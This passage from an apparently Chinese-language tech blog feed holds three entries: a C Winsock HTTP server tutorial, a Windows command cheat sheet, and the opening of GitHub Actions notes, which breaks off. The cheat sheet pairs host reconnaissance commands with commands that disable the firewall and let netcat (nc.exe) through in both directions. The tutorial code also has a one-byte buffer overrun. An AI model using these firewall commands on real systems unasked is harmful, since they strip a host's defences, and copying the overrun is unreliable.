class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 80 <span class="comment">// HTTP預設使用端口80</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACKLOG 10 <span class="comment">// 等待連接佇列的最大長度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 4096 <span class="comment">// 接收緩衝區的大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化WinSock庫</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立Socket</span></span><br><span class="line">    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 綁定Socket到本地地址和端口</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">    serverAddress.sin_family = AF_INET;</span><br><span class="line">    serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    serverAddress.sin_port = htons(PORT);</span><br><span class="line">    result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 監聽Socket</span></span><br><span class="line">    result = listen(listenSocket, BACKLOG);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 阻塞等待客戶端的連接</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line">    <span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">    SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 讀取客戶端發送的請求</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析HTTP請求</span></span><br><span class="line">    <span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">    sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 構造HTTP回應</span></span><br><span class="line">    <span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">    sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line">    <span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 發送HTTP回應</span></span><br><span class="line">    result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 關閉Socket</span></span><br><span class="line">    closesocket(clientSocket);</span><br><span class="line">    closesocket(listenSocket);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="程式主要流程"><a href="#程式主要流程" class="headerlink" title="程式主要流程"></a>程式主要流程</h2><ol><li>初始化 WinSock 函式庫</li><li>監聽Socket等待client端連接</li><li>接收client請求並解析其Method、URL以及協定版本</li><li>建構HTTP Response，發送給client端</li><li>關閉socket並清理Winsock資源</li></ol><h2 id="程式解釋"><a href="#程式解釋" class="headerlink" title="程式解釋"></a>程式解釋</h2><ul><li>首先一定要引入 &lt;winsock2.h&gt; 標頭檔</li><li>接著載入WinSock DLL  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>建立socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立Socket</span></span><br><span class="line">SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>綁定socket到本地位址與port  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 綁定Socket到本地地址和端口</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">serverAddress.sin_family = AF_INET;</span><br><span class="line">serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">serverAddress.sin_port = htons(PORT);</span><br><span class="line">result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>監聽Socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">result = listen(listenSocket, BACKLOG);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>等待客戶端連接  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line"><span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line"><span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">  <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>讀取客戶端請求  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line">buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br></pre></td></tr></table></figure></li><li>解析HTTP請求  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br></pre></td></tr></table></figure></li><li>建構HTTP回覆  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line"><span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br></pre></td></tr></table></figure></li><li>發送HTTP回覆  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br></pre></td></tr></table></figure></li><li>關閉socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">closesocket(clientSocket);</span><br><span class="line">closesocket(listenSocket);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure></li></ul><h2 id="程式執行結果"><a href="#程式執行結果" class="headerlink" title="程式執行結果"></a>程式執行結果</h2><ul><li>啟動HTTP Server<br><img src="https://i.imgur.com/J1qd5dQ.png"></li><li>存取 <a href="http://localhost/">http://localhost/</a><br><img src="https://i.imgur.com/wowoin8.png"></li><li>終端顯示結果<br><img src="https://i.imgur.com/ViLckvN.png"></li></ul><h2 id="Winsock2-h-中的函式用法及意義"><a href="#Winsock2-h-中的函式用法及意義" class="headerlink" title="Winsock2.h 中的函式用法及意義"></a>Winsock2.h 中的函式用法及意義</h2><ul><li><strong>WSAStartup</strong><ul><li>用於初始化 Winsock 函式庫，接收資料型別為<strong>WORD</strong>的版本參數以及資料型別為<strong>WSADATA</strong>的struct pointer</li><li>會回傳整數，函式呼叫成功則回傳0，否則回傳error code</li></ul></li><li><strong>socket</strong><ul><li>用於建立新的socket，接收三個參數: 協定家族、socket種類以及協定類型</li><li><pre><code class="c=">SOCKET WSAAPI socket(    [in] int af,    [in] int type,    [in] int protocol);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    - 他會回傳一個 **SOCKET**</span><br><span class="line">- **bind**</span><br><span class="line">    - 綁定Socket到本地地址和port，接收三個參數:socket 描述子、位址以及位址長度</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI bind(</span><br><span class="line">       [in] SOCKET         s,</span><br><span class="line">       [in] const sockaddr *name,</span><br><span class="line">       [in] int            namelen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>回傳整數</li></ul></li><li><strong>listen</strong><ul><li>用於監聽socket，等待客戶端連接，它接收兩個參數：socket描述子以及和等待連接佇列的最大長度</li><li><pre><code class="c=">int WSAAPI listen(    [in] SOCKET s,    [in] int    backlog  );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     - 回傳整數</span><br><span class="line">- **accept**</span><br><span class="line">    - 接受客戶端的連接，並回傳一個新的Socket描述子</span><br><span class="line">    - 接收兩個參數: Socket描述子和客戶端地址的pointer</span><br><span class="line">    - ```c=</span><br><span class="line">      SOCKET WSAAPI accept(</span><br><span class="line">         [in]      SOCKET   s,</span><br><span class="line">         [out]     sockaddr *addr,</span><br><span class="line">         [in, out] int      *addrlen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>會回傳一個 <strong>SOCKET</strong> 型別的值，以表示新的Socket描述子</li></ul></li><li><strong>recv</strong><ul><li>接收客戶端發送的資料</li><li>接收四個參數: Socket描述子、接收緩衝區的pointer、緩衝區的大小和接收選項</li><li><pre><code class="c=">int WSAAPI recv(   [in]  SOCKET s,   [out] char   *buf,   [in]  int    len,   [in]  int    flags );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    - 回傳整數</span><br><span class="line">- **send**</span><br><span class="line">    -  發送資料到客戶端</span><br><span class="line">    -  他接受四個參數: Socket描述子、發送緩衝區的pointer、緩衝區的大小和發送選項</span><br><span class="line">    -  ```c=</span><br><span class="line">       int WSAAPI send(</span><br><span class="line">         [in] SOCKET     s,</span><br><span class="line">         [in] const char *buf,</span><br><span class="line">         [in] int        len,</span><br><span class="line">         [in] int        flags</span><br><span class="line">        );</span><br></pre></td></tr></table></figure></code></pre></li><li>回傳整數</li></ul></li><li><strong>closesocket</strong><ul><li>關閉Socket</li><li>接收一個socket 描述子作為參數</li><li><pre><code class="c=">int WSAAPI closesocket(    [in] SOCKET s);  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    - 回傳整數</span><br><span class="line">- **WSACleanup**</span><br><span class="line">    - 清理WinSock函式庫的資源，不接收任何參數，並回傳整數</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI WSACleanup();</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>上述函式中任何回傳整數的函式，若回傳值為0，則為函式呼叫成功，否則為Error code</p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網路程式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>💻 Windows 常見指令</title>
      <link href="/posts/5b6eeeb3.html"/>
      <url>/posts/5b6eeeb3.html</url>
      
        <content type="html"><![CDATA[<h2 id="蒐集本機資訊"><a href="#蒐集本機資訊" class="headerlink" title="蒐集本機資訊"></a>蒐集本機資訊</h2><ul><li>網路設定資訊<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure></li><li>作業系統以及版本資訊<ul><li>中文版  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;作業系統名稱&quot; /C:&quot;作業系統版本&quot;</span><br></pre></td></tr></table></figure></li><li>英文版  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li>系統結構<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></li><li>查看安裝的軟體版本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li>查詢本機服務<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li>查詢處理程序列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li>查看啟動程式<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure></li><li>查看任務計畫<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li>查看主機開機時間<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></li><li>查看使用者列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></li><li>獲取本機管理員資訊<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></li><li>查看當前線上使用者<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure></li><li>列出本機電腦以及所連接的用戶端之間的Session<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session //通常需要admin 權限才能執行</span><br></pre></td></tr></table></figure></li><li>查詢通訊埠列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li>查路由表以及可用的ARP Cache表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></li><li>關閉防火牆<ul><li>Windows Server 2003及以前的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003之後的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul></li><li>查看防火牆設定<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure></li><li>修改防火牆設定<ul><li>Windows Server 2003及以前的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003之後的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>允許指定程式退出  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure></li><li>允許3389 Port通行  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure></li></ul></li><li>自訂防火牆紀錄檔的儲存位置<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 指令/工具用法整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>📑Github Action 學習筆記</title>
      <link href="/posts/24be9e02.html"/>
      <url>/posts/24be9e02.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/zn0lCzN.png"></p><p>我以前其實沒有CI&#x2F;CD的經驗，所以現有常見的CI&#x2F;CD平台其實都沒有太過了解，但近期因專案需求，需要透過Github Action　來建立一個用於Azure認知服務中的<strong>斷句API (BreakSentence API)</strong> 的CI&#x2F;CD Pipeline，在被交付的需求還很模糊的狀況下😭，還是先來了解這項功能，並且做個紀錄。</p><h2 id="基本介紹"><a href="#基本介紹" class="headerlink" title="基本介紹"></a>基本介紹</h2><p>是一個CI&#x2F;CD平台，能夠自動化建置(Build)、測試(Test)以及部署(Deployment)，使用者可以建立工作流程(Workflow)來建置以及測試每個對Repository的pull請求或者是將合併的pull請求部署到生產環境。</p><h2 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h2><p>構成Github Actions中的元件名詞如下</p><ul><li>Workflow</li><li>Event</li><li>Jobs</li><li>Runner</li><li>Steps</li><li>Action</li></ul><p>先講這些元件的合作起來的行為會是怎麼樣: 當Repository中發生某個 <strong>事件(Event)<strong>，此時你所設定的 Github Actions <strong>Workflows</strong> 被觸發。這裡的事件，舉例來說可以是</strong>一個pull request請求</strong>或是<strong>某個issued被建立</strong> 等等。</p><p><img src="https://i.imgur.com/SuvKp3J.png" alt="&#39;Github Action workflows&#39;"></p><p>你所定義的Workflow當中包含了一個或多個 <strong>Jobs</strong> ，這些Jobs可以是被<strong>平行處理(Parallel)</strong> 或是 <strong>依序處理(Sequential)</strong> ，每個Jobs會在自己的虛擬機Runner被處理，或者是在容器內運行。而每個Jobs中有包含了一個或多個 <strong>Steps</strong> ，會執行你定義的腳本或是某個 <strong>Action</strong>，Action是Github Action當中的最小單位，是一個可重複使用的擴展，通常是某些通用指令(?😥)</p><h2 id="🔀Workflows"><a href="#🔀Workflows" class="headerlink" title="🔀Workflows"></a>🔀Workflows</h2><ul><li>一個可設定來自動化流程的一個或多個Jobs被稱作為Workflow，可以透過撰寫YAML檔來定義Workflow,並在Event發生時被觸發，也可以手動觸發。</li><li>Workflow被定義在Repo中的 <code>.github/workflows</code> 